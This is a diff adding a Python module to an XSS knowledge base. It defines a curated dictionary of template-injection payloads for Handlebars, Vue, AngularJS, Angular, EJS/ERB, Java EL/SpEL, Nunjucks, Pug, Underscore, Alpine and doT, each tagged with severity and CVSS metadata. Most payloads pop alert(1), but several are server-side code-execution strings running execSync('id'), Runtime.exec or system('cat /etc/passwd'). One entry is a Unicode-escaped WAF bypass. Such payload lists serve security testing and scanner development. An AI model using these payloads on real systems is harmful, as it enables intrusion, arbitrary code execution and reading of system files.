@@ -1,0 +1,455 @@
+#!/usr/bin/env python3
+"""
+Project: BRS-KB (BRS XSS Knowledge Base)
+Company: EasyProTech LLC (www.easypro.tech)
+Dev: Brabus
+Date: 2026-01-10 UTC
+Status: Production
+Telegram: https://t.me/EasyProTech
+
+Client-Side Template Injection (CSTI) - Curated Collection
+Handlebars, Mustache, Vue, Angular, EJS, Nunjucks, Pug, Underscore, Alpine
+"""
+
+from ..models import PayloadEntry
+
+CSTI_ALL_PAYLOADS = {
+    # === Handlebars / Mustache ===
+    "csti_handlebars_constructor": PayloadEntry(
+        payload="{{constructor.constructor('alert(1)')()}}",
+        contexts=["template_injection", "handlebars", "mustache"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Handlebars constructor chain to Function constructor for arbitrary JS execution",
+        tags=["csti", "handlebars", "mustache", "constructor-chain", "rce"],
+        reliability="high",
+        browser_support=["all"],
+        known_affected=["handlebars < 4.7.7", "mustache.js"]
+    ),
+    "csti_handlebars_triple_stache": PayloadEntry(
+        payload="{{{<script>alert(1)</script>}}}",
+        contexts=["template_injection", "handlebars"],
+        severity="high",
+        cvss_score=8.5,
+        description="Handlebars triple-stache bypasses HTML escaping, renders raw HTML",
+        tags=["csti", "handlebars", "unescaped", "raw-html"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+    "csti_handlebars_each_helper": PayloadEntry(
+        payload="{{#each (constructor.constructor 'alert(1)')}}{{/each}}",
+        contexts=["template_injection", "handlebars"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Handlebars #each helper abuse for code execution via constructor chain",
+        tags=["csti", "handlebars", "helper", "each"],
+        reliability="medium",
+        browser_support=["all"]
+    ),
+    "csti_handlebars_with_helper": PayloadEntry(
+        payload="{{#with (constructor.constructor 'alert(1)')}}{{this}}{{/with}}",
+        contexts=["template_injection", "handlebars"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Handlebars #with helper context manipulation for RCE",
+        tags=["csti", "handlebars", "helper", "with"],
+        reliability="medium",
+        browser_support=["all"]
+    ),
+    "csti_mustache_proto": PayloadEntry(
+        payload="{{__proto__.constructor.constructor('alert(1)')()}}",
+        contexts=["template_injection", "mustache"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Mustache prototype chain traversal to Function constructor",
+        tags=["csti", "mustache", "prototype", "chain"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+
+    # === Vue.js ===
+    "csti_vue2_constructor": PayloadEntry(
+        payload="{{constructor.constructor('alert(1)')()}}",
+        contexts=["vue", "template_injection"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Vue 2.x template injection via constructor chain - classic sandbox escape",
+        tags=["csti", "vue", "vue2", "sandbox-escape"],
+        reliability="high",
+        browser_support=["all"],
+        known_affected=["vue 2.x"]
+    ),
+    "csti_vue2_openblock": PayloadEntry(
+        payload="{{_openBlock.constructor('alert(1)')()}}",
+        contexts=["vue", "template_injection"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Vue 2.x _openBlock internal function abuse for code execution",
+        tags=["csti", "vue", "vue2", "internal"],
+        reliability="high",
+        browser_support=["all"],
+        known_affected=["vue 2.x"]
+    ),
+    "csti_vue2_emit": PayloadEntry(
+        payload="{{$emit.constructor('alert(1)')()}}",
+        contexts=["vue", "template_injection"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Vue 2.x $emit method constructor chain for arbitrary JS",
+        tags=["csti", "vue", "vue2", "emit"],
+        reliability="high",
+        browser_support=["all"],
+        known_affected=["vue 2.x"]
+    ),
+    "csti_vue_vhtml": PayloadEntry(
+        payload='<div v-html="\'<img src=x onerror=alert(1)>\'"></div>',
+        contexts=["vue", "html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="Vue v-html directive renders unescaped HTML - XSS if user-controlled",
+        tags=["csti", "vue", "v-html", "directive"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+    "csti_vue3_suspense": PayloadEntry(
+        payload='<suspense><template #default><img src=x onerror=alert(1)></template></suspense>',
+        contexts=["vue", "html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="Vue 3 Suspense component slot injection for XSS",
+        tags=["csti", "vue", "vue3", "suspense", "slot"],
+        reliability="medium",
+        browser_support=["all"],
+        known_affected=["vue 3.x"]
+    ),
+    "csti_vue3_dynamic_component": PayloadEntry(
+        payload='<component :is="\'script\'">alert(1)</component>',
+        contexts=["vue", "html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="Vue 3 dynamic component with script tag injection",
+        tags=["csti", "vue", "vue3", "dynamic-component"],
+        reliability="medium",
+        browser_support=["all"]
+    ),
+
+    # === AngularJS (1.x) Sandbox Escapes ===
+    "csti_angular1_constructor": PayloadEntry(
+        payload="{{constructor.constructor('alert(1)')()}}",
+        contexts=["angular", "template_injection"],
+        severity="critical",
+        cvss_score=9.5,
+        description="AngularJS 1.x classic sandbox escape via constructor chain",
+        tags=["csti", "angular", "angularjs", "sandbox-escape"],
+        reliability="high",
+        browser_support=["all"],
+        known_affected=["angular 1.0-1.5"]
+    ),
+    "csti_angular1_on_constructor": PayloadEntry(
+        payload="{{$on.constructor('alert(1)')()}}",
+        contexts=["angular", "template_injection"],
+        severity="critical",
+        cvss_score=9.5,
+        description="AngularJS $on method constructor chain sandbox escape",
+        tags=["csti", "angular", "angularjs", "sandbox-escape", "$on"],
+        reliability="high",
+        browser_support=["all"],
+        known_affected=["angular 1.x"]
+    ),
+    "csti_angular1_number_constructor": PayloadEntry(
+        payload="{{(1).constructor.constructor('alert(1)')()}}",
+        contexts=["angular", "template_injection"],
+        severity="critical",
+        cvss_score=9.5,
+        description="AngularJS sandbox escape via Number literal constructor chain",
+        tags=["csti", "angular", "angularjs", "sandbox-escape", "number"],
+        reliability="high",
+        browser_support=["all"],
+        known_affected=["angular 1.x"]
+    ),
+    "csti_angular1_charat_override": PayloadEntry(
+        payload="{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
+        contexts=["angular", "template_injection"],
+        severity="critical",
+        cvss_score=9.5,
+        description="AngularJS sandbox escape via String.prototype.charAt override",
+        tags=["csti", "angular", "angularjs", "sandbox-escape", "prototype-override"],
+        reliability="high",
+        browser_support=["all"],
+        known_affected=["angular 1.2-1.5"],
+        spec_ref="CVE-2020-7676"
+    ),
+    "csti_angular1_eval_breakout": PayloadEntry(
+        payload="{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
+        contexts=["angular", "template_injection"],
+        severity="critical",
+        cvss_score=9.5,
+        description="AngularJS $eval breakout via charAt override and parser confusion",
+        tags=["csti", "angular", "angularjs", "sandbox-escape", "$eval"],
+        reliability="high",
+        browser_support=["all"],
+        known_affected=["angular 1.x"]
+    ),
+    "csti_angular1_ngfocus": PayloadEntry(
+        payload="<input ng-focus=\"constructor.constructor('alert(1)')()\" autofocus>",
+        contexts=["angular", "html_content"],
+        severity="critical",
+        cvss_score=9.5,
+        description="AngularJS ng-focus directive with sandbox escape payload",
+        tags=["csti", "angular", "angularjs", "ng-focus", "autofocus"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+    "csti_angular1_unicode_escape": PayloadEntry(
+        payload="{{\\u0063onstructor.\\u0063onstructor('alert(1)')()}}",
+        contexts=["angular", "template_injection"],
+        severity="critical",
+        cvss_score=9.5,
+        description="AngularJS sandbox escape with Unicode escapes to bypass WAF",
+        tags=["csti", "angular", "angularjs", "unicode", "waf-bypass"],
+        reliability="high",
+        browser_support=["all"],
+        waf_evasion=True
+    ),
+
+    # === Angular 2+ ===
+    "csti_angular2_innerhtml": PayloadEntry(
+        payload='<div [innerHTML]="\'<img src=x onerror=alert(1)>\'"></div>',
+        contexts=["angular", "html_content"],
+        severity="high",
+        cvss_score=7.5,
+        description="Angular 2+ innerHTML binding bypasses sanitization if marked as trusted",
+        tags=["csti", "angular", "angular2+", "innerhtml", "binding"],
+        reliability="medium",
+        browser_support=["all"],
+        known_affected=["angular 2+"]
+    ),
+    "csti_angular2_ngif_template": PayloadEntry(
+        payload='<ng-template [ngIf]="true"><script>alert(1)</script></ng-template>',
+        contexts=["angular", "html_content"],
+        severity="high",
+        cvss_score=7.5,
+        description="Angular 2+ ngIf with ng-template for conditional XSS injection",
+        tags=["csti", "angular", "angular2+", "ngif", "ng-template"],
+        reliability="medium",
+        browser_support=["all"]
+    ),
+
+    # === EJS / ERB ===
+    "csti_ejs_output": PayloadEntry(
+        payload="<%= alert(1) %>",
+        contexts=["ejs", "erb", "template_injection"],
+        severity="high",
+        cvss_score=8.5,
+        description="EJS/ERB output tag executes JavaScript in template context",
+        tags=["csti", "ejs", "erb", "output-tag"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+    "csti_ejs_unescaped": PayloadEntry(
+        payload="<%- '<script>alert(1)</script>' %>",
+        contexts=["ejs", "template_injection"],
+        severity="high",
+        cvss_score=8.5,
+        description="EJS unescaped output tag renders raw HTML without encoding",
+        tags=["csti", "ejs", "unescaped", "raw-html"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+    "csti_ejs_rce": PayloadEntry(
+        payload="<%= global.process.mainModule.require('child_process').execSync('id') %>",
+        contexts=["ejs", "template_injection"],
+        severity="critical",
+        cvss_score=9.8,
+        description="EJS server-side RCE via Node.js process module access",
+        tags=["csti", "ejs", "rce", "nodejs", "server-side"],
+        reliability="high",
+        attack_surface="server"
+    ),
+    "csti_erb_system": PayloadEntry(
+        payload="<%= system('cat /etc/passwd') %>",
+        contexts=["erb", "template_injection"],
+        severity="critical",
+        cvss_score=9.8,
+        description="ERB Ruby template RCE via system() call",
+        tags=["csti", "erb", "ruby", "rce", "server-side"],
+        reliability="high",
+        attack_surface="server"
+    ),
+
+    # === Expression Language (Java EL) ===
+    "csti_el_arithmetic": PayloadEntry(
+        payload="${7*7}",
+        contexts=["java", "el", "template_injection"],
+        severity="medium",
+        cvss_score=5.0,
+        description="Java EL arithmetic expression - detection payload",
+        tags=["csti", "el", "java", "detection"],
+        reliability="high",
+        attack_surface="server"
+    ),
+    "csti_el_runtime_exec": PayloadEntry(
+        payload="${T(java.lang.Runtime).getRuntime().exec('id')}",
+        contexts=["java", "el", "ssti"],
+        severity="critical",
+        cvss_score=9.8,
+        description="Java EL Runtime.exec() for arbitrary command execution",
+        tags=["csti", "el", "java", "rce", "runtime"],
+        reliability="high",
+        attack_surface="server",
+        known_affected=["spring-el", "ognl"]
+    ),
+    "csti_el_classloader": PayloadEntry(
+        payload="${request.getClass().getClassLoader()}",
+        contexts=["java", "el", "template_injection"],
+        severity="high",
+        cvss_score=7.5,
+        description="Java EL ClassLoader access for information disclosure",
+        tags=["csti", "el", "java", "classloader", "info-disclosure"],
+        reliability="high",
+        attack_surface="server"
+    ),
+    "csti_el_session_attr": PayloadEntry(
+        payload="${pageContext.request.getSession().getAttribute('admin')}",
+        contexts=["java", "el", "template_injection"],
+        severity="high",
+        cvss_score=7.5,
+        description="Java EL session attribute access for privilege escalation",
+        tags=["csti", "el", "java", "session", "privesc"],
+        reliability="high",
+        attack_surface="server"
+    ),
+    "csti_spel_rce": PayloadEntry(
+        payload="#{T(java.lang.Runtime).getRuntime().exec('calc')}",
+        contexts=["java", "spel", "ssti"],
+        severity="critical",
+        cvss_score=9.8,
+        description="Spring Expression Language (SpEL) RCE via Runtime.exec()",
+        tags=["csti", "spel", "spring", "java", "rce"],
+        reliability="high",
+        attack_surface="server",
+        known_affected=["spring framework"]
+    ),
+
+    # === Nunjucks ===
+    "csti_nunjucks_constructor": PayloadEntry(
+        payload="{{constructor.constructor('alert(1)')()}}",
+        contexts=["nunjucks", "template_injection"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Nunjucks template injection via constructor chain",
+        tags=["csti", "nunjucks", "constructor-chain"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+    "csti_nunjucks_range": PayloadEntry(
+        payload="{{range.constructor('alert(1)')()}}",
+        contexts=["nunjucks", "template_injection"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Nunjucks range global function constructor abuse",
+        tags=["csti", "nunjucks", "range", "global"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+
+    # === Pug (Jade) ===
+    "csti_pug_unbuffered": PayloadEntry(
+        payload="- var x = '<script>alert(1)</script>'\n!= x",
+        contexts=["pug", "jade", "template_injection"],
+        severity="high",
+        cvss_score=8.5,
+        description="Pug unbuffered code with unescaped output for XSS",
+        tags=["csti", "pug", "jade", "unbuffered"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+    "csti_pug_interpolation": PayloadEntry(
+        payload="#{constructor.constructor('alert(1)')()}",
+        contexts=["pug", "jade", "template_injection"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Pug interpolation with constructor chain for code execution",
+        tags=["csti", "pug", "jade", "interpolation"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+
+    # === Underscore.js / Lodash Templates ===
+    "csti_underscore_interpolate": PayloadEntry(
+        payload="<%= alert(1) %>",
+        contexts=["underscore", "lodash", "template_injection"],
+        severity="high",
+        cvss_score=8.5,
+        description="Underscore/Lodash template interpolation executes JS",
+        tags=["csti", "underscore", "lodash", "interpolate"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+    "csti_underscore_evaluate": PayloadEntry(
+        payload="<% alert(1) %>",
+        contexts=["underscore", "lodash", "template_injection"],
+        severity="high",
+        cvss_score=8.5,
+        description="Underscore/Lodash evaluate block for arbitrary JS execution",
+        tags=["csti", "underscore", "lodash", "evaluate"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+
+    # === Alpine.js ===
+    "csti_alpine_xdata": PayloadEntry(
+        payload='<div x-data="{}" x-init="alert(1)"></div>',
+        contexts=["alpine", "html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="Alpine.js x-init directive executes JS on component init",
+        tags=["csti", "alpine", "x-init", "directive"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+    "csti_alpine_xon": PayloadEntry(
+        payload='<button x-data @click="alert(1)">Click</button>',
+        contexts=["alpine", "html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="Alpine.js @click event handler for XSS",
+        tags=["csti", "alpine", "x-on", "event"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+    "csti_alpine_xhtml": PayloadEntry(
+        payload='<div x-data x-html="\'<img src=x onerror=alert(1)>\'"></div>',
+        contexts=["alpine", "html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="Alpine.js x-html directive renders unescaped HTML",
+        tags=["csti", "alpine", "x-html", "unescaped"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+
+    # === Dot.js ===
+    "csti_dot_interpolation": PayloadEntry(
+        payload="{{= '<script>alert(1)</script>' }}",
+        contexts=["dot", "template_injection"],
+        severity="high",
+        cvss_score=8.5,
+        description="doT.js interpolation with raw HTML output",
+        tags=["csti", "dot", "dotjs", "interpolation"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+    "csti_dot_evaluate": PayloadEntry(
+        payload="{{ alert(1) }}",
+        contexts=["dot", "template_injection"],
+        severity="high",
+        cvss_score=8.5,
+        description="doT.js evaluate block executes arbitrary JavaScript",
+        tags=["csti", "dot", "dotjs", "evaluate"],
+        reliability="high",
+        browser_support=["all"]
+    ),
+}
+
+CSTI_ALL_TOTAL = len(CSTI_ALL_PAYLOADS)
